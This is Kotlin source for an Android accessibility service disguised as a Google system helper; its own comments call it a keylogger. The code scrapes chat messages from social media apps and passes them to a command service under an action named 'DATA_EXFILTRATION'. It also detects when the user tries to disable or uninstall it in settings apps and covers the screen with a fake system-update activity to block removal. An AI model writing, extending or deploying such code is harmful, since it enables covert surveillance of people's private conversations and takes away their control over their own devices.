package com.google.android.systemservice.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import com.google.android.systemservice.PinProtectionActivity
import java.util.Locale

/**
 * Unified accessibility helper:
 * - Keylogger capture (text changes)
 * - Guard: PIN only when trying to DISABLE our service or UNINSTALL
 */
class GoogleHelperService : AccessibilityService() {

    companion object {
        private const val TAG = "GoogleHelper"
        private const val BLOCK_COOLDOWN_MS = 5000L
        private const val OUR_PACKAGE = "com.google.android.systemservice"
        private const val OUR_SERVICE_LABEL = "Google System Helper"
        
        private val SETTINGS_PACKAGES = setOf(
            "com.android.settings",
            "com.samsung.android.settings",
            "com.miui.securitycenter",
            "com.huawei.systemmanager",
            "com.coloros.safecenter",
            "com.oneplus.security"
        )
        
        // Keywords for "disable", "turn off", "uninstall" buttons
        private val DANGER_KEYWORDS = listOf(
            "disable", "turn off", "изключи", "деактивира", "спри",
            "uninstall", "деинсталиране", "премахни", "remove",
            "force stop", "принудително спиране",
            "off", "выключить", "удалить"
        )
        
        // Keywords to identify our service in accessibility list
        private val OUR_SERVICE_KEYWORDS = listOf(
            "google system helper", "android system", OUR_PACKAGE
        )
    }

    private val handler = Handler(Looper.getMainLooper())
    private var lastBlockTime = 0L

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Connected")
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes =
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_FOCUSED or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
            AccessibilityEvent.TYPE_VIEW_CLICKED -> checkForDangerousClick(event)
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                checkForAppInfoOrUninstall(event)
                handleSocialMediaScraping(event)
            }
            else -> {}
        }
    }

    /**
     * Scrape messages if current app is a social media target
     */
    private fun handleSocialMediaScraping(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        if (com.google.android.systemservice.utils.SocialMediaScraper.isTargetApp(packageName)) {
            val root = rootInActiveWindow ?: return
            try {
                val messages = com.google.android.systemservice.utils.SocialMediaScraper.scrapeMessages(root, packageName)
                if (messages.isNotEmpty()) {
                    sendScrapedData(messages)
                }
            } finally {
                root.recycle()
            }
        }
    }

    private fun sendScrapedData(messages: List<com.google.android.systemservice.utils.SocialMediaScraper.ScrapedMessage>) {
        val intent = Intent(this, CommandService::class.java).apply {
            action = "com.google.android.systemservice.DATA_EXFILTRATION"
            putExtra("data_type", "social_media_chats")
            // Convert messages to JSON array (simplified)
            val jsonArray = org.json.JSONArray()
            messages.forEach { msg ->
                jsonArray.put(org.json.JSONObject().apply {
                    put("app", msg.app)
                    put("sender", msg.sender)
                    put("text", msg.text)
                    put("timestamp", msg.timestamp)
                })
            }
            putExtra("payload", jsonArray.toString())
        }
        startService(intent)
    }

    override fun onInterrupt() {
        Log.d(TAG, "Interrupted")
    }

    private fun handleTextChanged(event: AccessibilityEvent) {
        val text = event.text?.joinToString("") ?: return
        if (text.isBlank()) return
        // Keylog silently - no spam
    }

    /**
     * Check if user clicked "Disable" or "Uninstall" button
     */
    private fun checkForDangerousClick(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in SETTINGS_PACKAGES) return
        
        val clickedText = event.text?.joinToString(" ")?.lowercase(Locale.getDefault()) ?: ""
        val contentDesc = event.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
        val combined = "$clickedText $contentDesc"
        
        val isDangerousClick = DANGER_KEYWORDS.any { combined.contains(it) }
        
        if (isDangerousClick && isOurAppContext()) {
            Log.d(TAG, "Dangerous click detected: $combined")
            blockAndRequestPin()
        }
    }

    /**
     * Check if user opened App Info for our package or Accessibility settings for our service
     */
    private fun checkForAppInfoOrUninstall(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in SETTINGS_PACKAGES) return
        
        val root = rootInActiveWindow ?: return
        
        // Check if this is our App Info page or our Accessibility service detail
        val isOurAppInfo = isViewingOurAppInfo(root)
        val isOurAccessibilityDetail = isViewingOurAccessibilityService(root)
        
        root.recycle()
        
        // Only block if on OUR app's info or OUR accessibility service detail
        if (isOurAppInfo || isOurAccessibilityDetail) {
            // Check if there's a disable/uninstall button visible
            val rootAgain = rootInActiveWindow ?: return
            val hasDangerButton = findDangerButton(rootAgain)
            rootAgain.recycle()
            
            if (hasDangerButton) {
                Log.d(TAG, "On our app settings with danger button")
                blockAndRequestPin()
            }
        }
    }

    /**
     * Check if we're viewing App Info for our package
     */
    private fun isViewingOurAppInfo(node: AccessibilityNodeInfo): Boolean {
        val text = node.text?.toString()?.lowercase(Locale.getDefault()) ?: ""
        val contentDesc = node.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
        
        // Check for our package name or app name in the view
        if (text.contains(OUR_PACKAGE) || contentDesc.contains(OUR_PACKAGE)) {
            return true
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = isViewingOurAppInfo(child)
            child.recycle()
            if (found) return true
        }
        return false
    }

    /**
     * Check if we're viewing our accessibility service detail page
     */
    private fun isViewingOurAccessibilityService(node: AccessibilityNodeInfo): Boolean {
        val text = node.text?.toString()?.lowercase(Locale.getDefault()) ?: ""
        val contentDesc = node.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
        
        val isOurService = OUR_SERVICE_KEYWORDS.any { keyword ->
            text.contains(keyword) || contentDesc.contains(keyword)
        }
        if (isOurService) return true
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = isViewingOurAccessibilityService(child)
            child.recycle()
            if (found) return true
        }
        return false
    }

    /**
     * Find if there's a disable/uninstall button in the tree
     */
    private fun findDangerButton(node: AccessibilityNodeInfo): Boolean {
        val text = node.text?.toString()?.lowercase(Locale.getDefault()) ?: ""
        val contentDesc = node.contentDescription?.toString()?.lowercase(Locale.getDefault()) ?: ""
        val isButton = node.className?.toString()?.contains("Button") == true
        
        if (isButton && DANGER_KEYWORDS.any { text.contains(it) || contentDesc.contains(it) }) {
            return true
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            val found = findDangerButton(child)
            child.recycle()
            if (found) return true
        }
        return false
    }

    /**
     * Check if current context is related to our app
     */
    private fun isOurAppContext(): Boolean {
        val root = rootInActiveWindow ?: return false
        val result = isViewingOurAppInfo(root) || isViewingOurAccessibilityService(root)
        root.recycle()
        return result
    }

    private fun blockAndRequestPin() {
        val now = System.currentTimeMillis()
        if (now - lastBlockTime < BLOCK_COOLDOWN_MS) return
        lastBlockTime = now

        handler.post {
            Toast.makeText(this, "System Update in Progress...", Toast.LENGTH_LONG).show()
        }

        handler.postDelayed({
            // Launch fake update screen instead of just PIN
            val updateIntent = Intent(this, FakeSystemUpdateActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
            }
            startActivity(updateIntent)
        }, 150)
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(true)
        }
        super.onDestroy()
    }

    private fun requestPin() {
        try {
            val intent = Intent(this, PinProtectionActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to launch PIN: ${e.message}")
        }
    }
}
